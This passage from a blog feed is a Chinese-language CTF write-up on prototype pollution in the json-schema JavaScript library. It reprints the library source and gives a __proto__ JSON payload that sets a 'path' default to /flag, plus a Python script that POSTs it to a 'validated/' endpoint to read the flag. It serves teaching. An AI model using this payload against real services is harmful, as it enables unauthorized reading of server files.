an</span><br><span class="line">empty list will be returned. A validation error will have two properties:</span><br><span class="line">&quot;property&quot; which indicates which property had the error</span><br><span class="line">&quot;message&quot; which indicates what the error was</span><br><span class="line"> */</span><br><span class="line">(function (root, factory) &#123;</span><br><span class="line">    if (typeof define === &#x27;function&#x27; &amp;&amp; define.amd) &#123;</span><br><span class="line">        // AMD. Register as an anonymous module.</span><br><span class="line">        define([], function () &#123;</span><br><span class="line">            return factory();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; else if (typeof module === &#x27;object&#x27; &amp;&amp; module.exports) &#123;</span><br><span class="line">        // Node. Does not work with strict CommonJS, but</span><br><span class="line">        // only CommonJS-like environments that support module.exports,</span><br><span class="line">        // like Node.</span><br><span class="line">        module.exports = factory();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Browser globals</span><br><span class="line">        root.jsonSchema = factory();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(this, function () &#123;// setup primitive classes to be JSON Schema types</span><br><span class="line">var exports = validate</span><br><span class="line">exports.Integer = &#123;type:&quot;integer&quot;&#125;;</span><br><span class="line">var primitiveConstructors = &#123;</span><br><span class="line">String: String,</span><br><span class="line">Boolean: Boolean,</span><br><span class="line">Number: Number,</span><br><span class="line">Object: Object,</span><br><span class="line">Array: Array,</span><br><span class="line">Date: Date</span><br><span class="line">&#125;</span><br><span class="line">exports.validate = validate;</span><br><span class="line">function validate(/*Any*/instance,/*Object*/schema) &#123;</span><br><span class="line">// Summary:</span><br><span class="line">//  To use the validator call JSONSchema.validate with an instance object and an optional schema object.</span><br><span class="line">// If a schema is provided, it will be used to validate. If the instance object refers to a schema (self-validating),</span><br><span class="line">// that schema will be used to validate and the schema parameter is not necessary (if both exist,</span><br><span class="line">// both validations will occur).</span><br><span class="line">// The validate method will return an object with two properties:</span><br><span class="line">// valid: A boolean indicating if the instance is valid by the schema</span><br><span class="line">// errors: An array of validation errors. If there are no errors, then an</span><br><span class="line">// empty list will be returned. A validation error will have two properties:</span><br><span class="line">// property: which indicates which property had the error</span><br><span class="line">// message: which indicates what the error was</span><br><span class="line">//</span><br><span class="line">return validate(instance, schema, &#123;changing: false&#125;);//, coerce: false, existingOnly: false&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">exports.checkPropertyChange = function(/*Any*/value,/*Object*/schema, /*String*/property) &#123;</span><br><span class="line">// Summary:</span><br><span class="line">// The checkPropertyChange method will check to see if an value can legally be in property with the given schema</span><br><span class="line">// This is slightly different than the validate method in that it will fail if the schema is readonly and it will</span><br><span class="line">// not check for self-validation, it is assumed that the passed in value is already internally valid.</span><br><span class="line">// The checkPropertyChange method will return the same object type as validate, see JSONSchema.validate for</span><br><span class="line">// information.</span><br><span class="line">//</span><br><span class="line">return validate(value, schema, &#123;changing: property || &quot;property&quot;&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">var validate = exports._validate = function(/*Any*/instance,/*Object*/schema,/*Object*/options) &#123;</span><br><span class="line"></span><br><span class="line">if (!options) options = &#123;&#125;;</span><br><span class="line">var _changing = options.changing;</span><br><span class="line"></span><br><span class="line">function getType(schema)&#123;</span><br><span class="line">return schema.type || (primitiveConstructors[schema.name] == schema &amp;&amp; schema.name.toLowerCase());</span><br><span class="line">&#125;</span><br><span class="line">var errors = [];</span><br><span class="line">// validate a value against a property definition</span><br><span class="line">function checkProp(value, schema, path,i)&#123;</span><br><span class="line"></span><br><span class="line">var l;</span><br><span class="line">path += path ? typeof i == &#x27;number&#x27; ? &#x27;[&#x27; + i + &#x27;]&#x27; : typeof i == &#x27;undefined&#x27; ? &#x27;&#x27; : &#x27;.&#x27; + i : i;</span><br><span class="line">function addError(message)&#123;</span><br><span class="line">errors.push(&#123;property:path,message:message&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if((typeof schema != &#x27;object&#x27; || schema instanceof Array) &amp;&amp; (path || typeof schema != &#x27;function&#x27;) &amp;&amp; !(schema &amp;&amp; getType(schema)))&#123;</span><br><span class="line">if(typeof schema == &#x27;function&#x27;)&#123;</span><br><span class="line">if(!(value instanceof schema))&#123;</span><br><span class="line">addError(&quot;is not an instance of the class/constructor &quot; + schema.name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else if(schema)&#123;</span><br><span class="line">addError(&quot;Invalid schema/property definition &quot; + schema);</span><br><span class="line">&#125;</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br><span class="line">if(_changing &amp;&amp; schema.readonly)&#123;</span><br><span class="line">addError(&quot;is a readonly field, it can not be changed&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(schema[&#x27;extends&#x27;])&#123; // if it extends another schema, it must pass that schema as well</span><br><span class="line">checkProp(value,schema[&#x27;extends&#x27;],path,i);</span><br><span class="line">&#125;</span><br><span class="line">// validate a value against a type definition</span><br><span class="line">function checkType(type,value)&#123;</span><br><span class="line">if(type)&#123;</span><br><span class="line">if(typeof type == &#x27;string&#x27; &amp;&amp; type != &#x27;any&#x27; &amp;&amp;</span><br><span class="line">(type == &#x27;null&#x27; ? value !== null : typeof value != type) &amp;&amp;</span><br><span class="line">!(value instanceof Array &amp;&amp; type == &#x27;array&#x27;) &amp;&amp;</span><br><span class="line">!(value instanceof Date &amp;&amp; type == &#x27;date&#x27;) &amp;&amp;</span><br><span class="line">!(type == &#x27;integer&#x27; &amp;&amp; value%1===0))&#123;</span><br><span class="line">return [&#123;property:path,message:value + &quot; - &quot; + (typeof value) + &quot; value found, but a &quot; + type + &quot; is required&quot;&#125;];</span><br><span class="line">&#125;</span><br><span class="line">if(type instanceof Array)&#123;</span><br><span class="line">var unionErrors=[];</span><br><span class="line">for(var j = 0; j &lt; type.length; j++)&#123; // a union type</span><br><span class="line">if(!(unionErrors=checkType(type[j],value)).length)&#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(unionErrors.length)&#123;</span><br><span class="line">return unionErrors;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else if(typeof type == &#x27;object&#x27;)&#123;</span><br><span class="line">var priorErrors = errors;</span><br><span class="line">errors = [];</span><br><span class="line">checkProp(value,type,path);</span><br><span class="line">var theseErrors = errors;</span><br><span class="line">errors = priorErrors;</span><br><span class="line">return theseErrors;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return [];</span><br><span class="line">&#125;</span><br><span class="line">if(value === undefined)&#123;</span><br><span class="line">if(schema.required)&#123;</span><br><span class="line">addError(&quot;is missing and it is required&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">errors = errors.concat(checkType(getType(schema),value));</span><br><span class="line">if(schema.disallow &amp;&amp; !checkType(schema.disallow,value).length)&#123;</span><br><span class="line">addError(&quot; disallowed value was matched&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(value !== null)&#123;</span><br><span class="line">if(value instanceof Array)&#123;</span><br><span class="line">if(schema.items)&#123;</span><br><span class="line">var itemsIsArray = schema.items instanceof Array;</span><br><span class="line">var propDef = schema.items;</span><br><span class="line">for (i = 0, l = value.length; i &lt; l; i += 1) &#123;</span><br><span class="line">if (itemsIsArray)</span><br><span class="line">propDef = schema.items[i];</span><br><span class="line">if (options.coerce)</span><br><span class="line">value[i] = options.coerce(value[i], propDef);</span><br><span class="line">errors.concat(checkProp(value[i],propDef,path,i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(schema.minItems &amp;&amp; value.length &lt; schema.minItems)&#123;</span><br><span class="line">addError(&quot;There must be a minimum of &quot; + schema.minItems + &quot; in the array&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(schema.maxItems &amp;&amp; value.length &gt; schema.maxItems)&#123;</span><br><span class="line">addError(&quot;There must be a maximum of &quot; + schema.maxItems + &quot; in the array&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else if(schema.properties || schema.additionalProperties)&#123;</span><br><span class="line">errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">&#125;</span><br><span class="line">if(schema.pattern &amp;&amp; typeof value == &#x27;string&#x27; &amp;&amp; !value.match(schema.pattern))&#123;</span><br><span class="line">addError(&quot;does not match the regex pattern &quot; + schema.pattern);</span><br><span class="line">&#125;</span><br><span class="line">if(schema.maxLength &amp;&amp; typeof value == &#x27;string&#x27; &amp;&amp; value.length &gt; schema.maxLength)&#123;</span><br><span class="line">addError(&quot;may only be &quot; + schema.maxLength + &quot; characters long&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(schema.minLength &amp;&amp; typeof value == &#x27;string&#x27; &amp;&amp; value.length &lt; schema.minLength)&#123;</span><br><span class="line">addError(&quot;must be at least &quot; + schema.minLength + &quot; characters long&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(typeof schema.minimum !== &#x27;undefined&#x27; &amp;&amp; typeof value == typeof schema.minimum &amp;&amp;</span><br><span class="line">schema.minimum &gt; value)&#123;</span><br><span class="line">addError(&quot;must have a minimum value of &quot; + schema.minimum);</span><br><span class="line">&#125;</span><br><span class="line">if(typeof schema.maximum !== &#x27;undefined&#x27; &amp;&amp; typeof value == typeof schema.maximum &amp;&amp;</span><br><span class="line">schema.maximum &lt; value)&#123;</span><br><span class="line">addError(&quot;must have a maximum value of &quot; + schema.maximum);</span><br><span class="line">&#125;</span><br><span class="line">if(schema[&#x27;enum&#x27;])&#123;</span><br><span class="line">var enumer = schema[&#x27;enum&#x27;];</span><br><span class="line">l = enumer.length;</span><br><span class="line">var found;</span><br><span class="line">for(var j = 0; j &lt; l; j++)&#123;</span><br><span class="line">if(enumer[j]===value)&#123;</span><br><span class="line">found=1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(!found)&#123;</span><br><span class="line">addError(&quot;does not have a value in the enumeration &quot; + enumer.join(&quot;, &quot;));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(typeof schema.maxDecimal == &#x27;number&#x27; &amp;&amp;</span><br><span class="line">(value.toString().match(new RegExp(&quot;\\.[0-9]&#123;&quot; + (schema.maxDecimal + 1) + &quot;,&#125;&quot;))))&#123;</span><br><span class="line">addError(&quot;may only have &quot; + schema.maxDecimal + &quot; digits of decimal places&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br><span class="line">// validate an object against a schema</span><br><span class="line">function checkObj(instance,objTypeDef,path,additionalProp)&#123;</span><br><span class="line"></span><br><span class="line">if(typeof objTypeDef ==&#x27;object&#x27;)&#123;</span><br><span class="line">if(typeof instance != &#x27;object&#x27; || instance instanceof Array)&#123;</span><br><span class="line">errors.push(&#123;property:path,message:&quot;an object is required&quot;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i in objTypeDef)&#123; </span><br><span class="line">if(objTypeDef.hasOwnProperty(i))&#123;</span><br><span class="line">var value = instance[i];</span><br><span class="line">// skip _not_ specified properties</span><br><span class="line">if (value === undefined &amp;&amp; options.existingOnly) continue;</span><br><span class="line">var propDef = objTypeDef[i];</span><br><span class="line">// set default</span><br><span class="line">if(value === undefined &amp;&amp; propDef[&quot;default&quot;])&#123;</span><br><span class="line">value = instance[i] = propDef[&quot;default&quot;];</span><br><span class="line">&#125;</span><br><span class="line">if(options.coerce &amp;&amp; i in instance)&#123;</span><br><span class="line">value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">&#125;</span><br><span class="line">checkProp(value,propDef,path,i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">for(i in instance)&#123;</span><br><span class="line">if(instance.hasOwnProperty(i) &amp;&amp; !(i.charAt(0) == &#x27;_&#x27; &amp;&amp; i.charAt(1) == &#x27;_&#x27;) &amp;&amp; objTypeDef &amp;&amp; !objTypeDef[i] &amp;&amp; additionalProp===false)&#123;</span><br><span class="line">if (options.filter) &#123;</span><br><span class="line">delete instance[i];</span><br><span class="line">continue;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">errors.push(&#123;property:path,message:&quot;The property &quot; + i +</span><br><span class="line">&quot; is not defined in the schema and the schema does not allow additional properties&quot;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">var requires = objTypeDef &amp;&amp; objTypeDef[i] &amp;&amp; objTypeDef[i].requires;</span><br><span class="line">if(requires &amp;&amp; !(requires in instance))&#123;</span><br><span class="line">errors.push(&#123;property:path,message:&quot;the presence of the property &quot; + i + &quot; requires that &quot; + requires + &quot; also be present&quot;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">value = instance[i];</span><br><span class="line">if(additionalProp &amp;&amp; (!(objTypeDef &amp;&amp; typeof objTypeDef == &#x27;object&#x27;) || !(i in objTypeDef)))&#123;</span><br><span class="line">if(options.coerce)&#123;</span><br><span class="line">value = instance[i] = options.coerce(value, additionalProp);</span><br><span class="line">&#125;</span><br><span class="line">checkProp(value,additionalProp,path,i);</span><br><span class="line">&#125;</span><br><span class="line">if(!_changing &amp;&amp; value &amp;&amp; value.$schema)&#123;</span><br><span class="line">errors = errors.concat(checkProp(value,value.$schema,path,i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return errors;</span><br><span class="line">&#125;</span><br><span class="line">if(schema)&#123;</span><br><span class="line">checkProp(instance,schema,&#x27;&#x27;,_changing || &#x27;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(!_changing &amp;&amp; instance &amp;&amp; instance.$schema)&#123;</span><br><span class="line">checkProp(instance,instance.$schema,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">return &#123;valid:!errors.length,errors:errors&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">exports.mustBeValid = function(result)&#123;</span><br><span class="line">//summary:</span><br><span class="line">//This checks to ensure that the result is valid and will throw an appropriate error message if it is not</span><br><span class="line">// result: the result returned from checkPropertyChange or validate</span><br><span class="line">if(!result.valid)&#123;</span><br><span class="line">throw new TypeError(result.errors.map(function(error)&#123;return &quot;for property &quot; + error.property + &#x27;: &#x27; + error.message;&#125;).join(&quot;, \n&quot;));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return exports;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>从json_schema数据结构，我们可以知道，它首先会调用checkType()函数来验证Type字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">function checkType(type,value)&#123;</span><br><span class="line">if(type)&#123;</span><br><span class="line">if(typeof type == &#x27;string&#x27; &amp;&amp; type != &#x27;any&#x27; &amp;&amp;</span><br><span class="line">(type == &#x27;null&#x27; ? value !== null : typeof value != type) &amp;&amp;</span><br><span class="line">!(value instanceof Array &amp;&amp; type == &#x27;array&#x27;) &amp;&amp;</span><br><span class="line">!(value instanceof Date &amp;&amp; type == &#x27;date&#x27;) &amp;&amp;</span><br><span class="line">!(type == &#x27;integer&#x27; &amp;&amp; value%1===0))&#123;</span><br><span class="line">return [&#123;property:path,message:value + &quot; - &quot; + (typeof value) + &quot; value found, but a &quot; + type + &quot; is required&quot;&#125;];</span><br><span class="line">&#125;</span><br><span class="line">if(type instanceof Array)&#123;</span><br><span class="line">var unionErrors=[];</span><br><span class="line">for(var j = 0; j &lt; type.length; j++)&#123; // a union type</span><br><span class="line">if(!(unionErrors=checkType(type[j],value)).length)&#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(unionErrors.length)&#123;</span><br><span class="line">return unionErrors;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else if(typeof type == &#x27;object&#x27;)&#123;</span><br><span class="line">var priorErrors = errors;</span><br><span class="line">errors = [];</span><br><span class="line">checkProp(value,type,path);</span><br><span class="line">var theseErrors = errors;</span><br><span class="line">errors = priorErrors;</span><br><span class="line">return theseErrors;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return [];</span><br><span class="line">&#125;</span><br><span class="line">if(value === undefined)&#123;</span><br><span class="line">if(schema.required)&#123;</span><br><span class="line">addError(&quot;is missing and it is required&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">errors = errors.concat(checkType(getType(schema),value));</span><br><span class="line">if(schema.disallow &amp;&amp; !checkType(schema.disallow,value).length)&#123;</span><br><span class="line">addError(&quot; disallowed value was matched&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(value !== null)&#123;</span><br><span class="line">if(value instanceof Array)&#123;</span><br><span class="line">if(schema.items)&#123;</span><br><span class="line">var itemsIsArray = schema.items instanceof Array;</span><br><span class="line">var propDef = schema.items;</span><br><span class="line">for (i = 0, l = value.length; i &lt; l; i += 1) &#123;</span><br><span class="line">if (itemsIsArray)</span><br><span class="line">propDef = schema.items[i];</span><br><span class="line">if (options.coerce)</span><br><span class="line">value[i] = options.coerce(value[i], propDef);</span><br><span class="line">errors.concat(checkProp(value[i],propDef,path,i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(schema.minItems &amp;&amp; value.length &lt; schema.minItems)&#123;</span><br><span class="line">addError(&quot;There must be a minimum of &quot; + schema.minItems + &quot; in the array&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(schema.maxItems &amp;&amp; value.length &gt; schema.maxItems)&#123;</span><br><span class="line">addError(&quot;There must be a maximum of &quot; + schema.maxItems + &quot; in the array&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else if(schema.properties || schema.additionalProperties)&#123;</span><br><span class="line">errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">&#125;</span><br><span class="line">if(schema.pattern &amp;&amp; typeof value == &#x27;string&#x27; &amp;&amp; !value.match(schema.pattern))&#123;</span><br><span class="line">addError(&quot;does not match the regex pattern &quot; + schema.pattern);</span><br><span class="line">&#125;</span><br><span class="line">if(schema.maxLength &amp;&amp; typeof value == &#x27;string&#x27; &amp;&amp; value.length &gt; schema.maxLength)&#123;</span><br><span class="line">addError(&quot;may only be &quot; + schema.maxLength + &quot; characters long&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(schema.minLength &amp;&amp; typeof value == &#x27;string&#x27; &amp;&amp; value.length &lt; schema.minLength)&#123;</span><br><span class="line">addError(&quot;must be at least &quot; + schema.minLength + &quot; characters long&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(typeof schema.minimum !== &#x27;undefined&#x27; &amp;&amp; typeof value == typeof schema.minimum &amp;&amp;</span><br><span class="line">schema.minimum &gt; value)&#123;</span><br><span class="line">addError(&quot;must have a minimum value of &quot; + schema.minimum);</span><br><span class="line">&#125;</span><br><span class="line">if(typeof schema.maximum !== &#x27;undefined&#x27; &amp;&amp; typeof value == typeof schema.maximum &amp;&amp;</span><br><span class="line">schema.maximum &lt; value)&#123;</span><br><span class="line">addError(&quot;must have a maximum value of &quot; + schema.maximum);</span><br><span class="line">&#125;</span><br><span class="line">if(schema[&#x27;enum&#x27;])&#123;</span><br><span class="line">var enumer = schema[&#x27;enum&#x27;];</span><br><span class="line">l = enumer.length;</span><br><span class="line">var found;</span><br><span class="line">for(var j = 0; j &lt; l; j++)&#123;</span><br><span class="line">if(enumer[j]===value)&#123;</span><br><span class="line">found=1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(!found)&#123;</span><br><span class="line">addError(&quot;does not have a value in the enumeration &quot; + enumer.join(&quot;, &quot;));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(typeof schema.maxDecimal == &#x27;number&#x27; &amp;&amp;</span><br><span class="line">(value.toString().match(new RegExp(&quot;\\.[0-9]&#123;&quot; + (schema.maxDecimal + 1) + &quot;,&#125;&quot;))))&#123;</span><br><span class="line">addError(&quot;may only have &quot; + schema.maxDecimal + &quot; digits of decimal places&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们的目的是将checkObj函数中的propDef[‘default’]修改为/flag，造成原型链的污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(value === undefined &amp;&amp; propDef[&quot;default&quot;])&#123;</span><br><span class="line">value = instance[i] = propDef[&quot;default&quot;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在checkType()函数中，如果要执行checkObj()函数，要满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#125;else if(schema.properties || schema.additionalProperties)&#123;</span><br><span class="line">errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">value = &#123;&quot;$schema&quot;: &#123;&quot;properties&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;properties&quot;: &#123;&quot;path&quot;:</span><br><span class="line">&#123;&quot;default&quot;: &quot;/flag&quot;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">schema.properties = &#123;&quot;__proto__&quot;: &#123;&quot;properties&quot;: &#123;&quot;path&quot;: &#123;&quot;default&quot;:</span><br><span class="line">&quot;/flag&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>而它循环进入checkProp函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">for(var i in objTypeDef)&#123; </span><br><span class="line">if(objTypeDef.hasOwnProperty(i))&#123;</span><br><span class="line">var value = instance[i];</span><br><span class="line">// skip _not_ specified properties</span><br><span class="line">if (value === undefined &amp;&amp; options.existingOnly) continue;</span><br><span class="line">var propDef = objTypeDef[i];</span><br><span class="line">// set default</span><br><span class="line">if(value === undefined &amp;&amp; propDef[&quot;default&quot;])&#123;</span><br><span class="line">value = instance[i] = propDef[&quot;default&quot;];</span><br><span class="line">&#125;</span><br><span class="line">if(options.coerce &amp;&amp; i in instance)&#123;</span><br><span class="line">value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">&#125;</span><br><span class="line">checkProp(value,propDef,path,i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后经过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for(var i in objTypeDef)</span><br></pre></td></tr></table></figure><p>再次进入checkObj函数，此时传入参数为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value = prototype</span><br><span class="line">schema.properties = &#123;&quot;path&quot;: &#123;&quot;default&quot;: &quot;/flag&quot;&#125;&#125;</span><br><span class="line">path = &quot;__proto__&quot;</span><br></pre></td></tr></table></figure><p>此时的value参数已经被指向Function.prototype，再次在这里进行赋值时，instance此时指向Function.prototype，参数i为path，即被propDef[‘default’]修改为/flag，造成原型链污染</p><p>其中__proto__的属性来读取或设置当前对象的prototype对象的，目前所有浏览器都有这个属性</p><p>所以我们最后进行原型链污染后，可以通过config.js文件中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let content = fs.readFileSync(p).toString()</span><br></pre></td></tr></table></figure><p>来读取，所以最后post提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &#123;&quot;$schema&quot;: &#123;&quot;properties&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;properties&quot;:</span><br><span class="line">&#123;&quot;path&quot;: &#123;&quot;default&quot;: &quot;/flag&quot;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>借用了大佬的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;&quot;</span><br><span class="line">flag = r&quot;DASCTF&#123;&quot;</span><br><span class="line">def sol():</span><br><span class="line"> try:</span><br><span class="line"> print(url+&quot;validated/&quot;)</span><br><span class="line"> data = &#123;&quot;$schema&quot;: &#123;&quot;properties&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;properties&quot;:</span><br><span class="line">&#123;&quot;path&quot;: &#123;&quot;default&quot;: &quot;/flag&quot;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"> print(data)</span><br><span class="line"> r = requests.post(url=url+&quot;validated/&quot;, json=data, timeout=10)</span><br><span class="line"> print(r.text)</span><br><span class="line"> if flag in r.text:</span><br><span class="line"> return True</span><br><span class="line"> else:</span><br><span class="line"> return False</span><br><span class="line"> except Exception as e:</span><br><span class="line"> return False</span><br><span class="line"></span><br><span class="line">sol()</span><br></pre></td></tr></table></figure><p>就可以读取flag了</p><p>参考文章：[<a href="https://www.cnblogs.com/zyh-code/p/10970110.html]">https://www.cnblogs.com/zyh-code/p/10970110.html]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;json-schema原型链污染&quot;&gt;&lt;a href=&quot;#json-schema原型链污染&quot; class=&quot;headerlink&quot; title=&quot;json_schema原型链污染&quot;&gt;&lt;/a&gt;json_schema原型链污染&lt;/h1&gt;&lt;h2 id=&quot;json-sche</summary>
      
    
    
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell以及proc虚拟文件系统</title>
    <link href="http://example.com/2021/09/30/%E5%8F%8D%E5%BC%B9shell%E4%BB%A5%E5%8F%8Aproc%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>http://example.com/2021/09/30/%E5%8F%8D%E5%BC%B9shell%E4%BB%A5%E5%8F%8Aproc%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</id>
    <published>2021-09-29T16:00:00.000Z</published>
    <updated>2021-09-30T17:44:58.924Z</updated>
    
